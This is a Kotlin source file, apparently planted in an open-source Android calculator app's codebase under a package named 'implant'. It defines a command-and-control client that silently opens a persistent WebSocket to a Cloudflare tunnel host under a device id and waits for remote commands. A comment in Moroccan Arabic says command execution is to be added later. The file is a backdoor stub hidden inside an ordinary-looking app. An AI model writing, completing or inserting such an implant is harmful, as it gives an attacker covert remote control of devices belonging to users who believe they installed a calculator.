package com.darkempire78.opencalculator.implant

import okhttp3.*
import java.util.concurrent.TimeUnit

object C2Client {
    private const val C2_URL = "wss://interested-assisted-cms-enter.trycloudflare.com/ws/device_001"
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    fun connect() {
        val request = Request.Builder().url(C2_URL).build()
        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                println("[C2] Connected")
            }
            override fun onMessage(webSocket: WebSocket, text: String) {
                println("[C2] Command: $text")
                // هنا غادي نزيدو تنفيذ الأوامر من بعد
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                println("[C2] Failed: ${t.message}")
            }
        })
    }
}
